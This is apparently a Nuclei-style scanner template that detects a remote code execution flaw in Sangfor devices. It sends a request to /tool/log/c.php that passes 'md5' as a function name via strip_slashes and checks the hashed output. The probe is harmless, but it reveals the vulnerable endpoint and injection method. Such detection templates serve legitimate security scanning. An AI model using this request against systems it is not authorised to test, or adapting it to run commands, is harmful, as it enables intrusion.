id: poc-yaml-sangfor-ba-rce
info:
  name: Sangfor Ba Remote Code Execution Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  tags: rce
  description: |
    Sangfor Ba Remote Code Execution vulnerability allows an attacker to execute arbitrary commands on the server.

variables:
  r1: '{{rand_text_alphanumeric(8)}}'

http:
  - method: GET
    path:
      - '{{BaseURL}}/tool/log/c.php?strip_slashes=md5&host={{r1}}'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - 'content-type'
        part: header
      - type: word
        words:
          - 'text/html'
        part: header
      - type: word
        words:
          - '{{md5(r1)}}'
        part: body
